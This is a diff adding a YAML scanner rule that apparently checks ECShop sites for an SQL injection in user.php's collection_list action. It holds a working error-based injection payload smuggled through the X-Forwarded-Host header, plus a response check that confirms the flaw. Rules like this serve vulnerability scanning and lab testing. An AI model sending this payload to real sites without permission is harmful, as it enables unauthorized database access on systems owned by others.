@@ -1,0 +1,14 @@
+name: poc-yaml-ecshop-collection-list-sqli
+set:
+    r1: randomInt(10000, 99999)
+rules:
+  - method: GET
+    path: /user.php?act=collection_list
+    headers:
+        X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(md5({{r1}}),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
+    follow_redirects: false
+    expression: response.body.bcontains(bytes(substr(md5(string(r1)), 1, 32)))
+detail:
+    author: 曦shen
+    links:
+        - https://github.com/vulhub/vulhub/tree/master/ecshop/collection_list-sqli
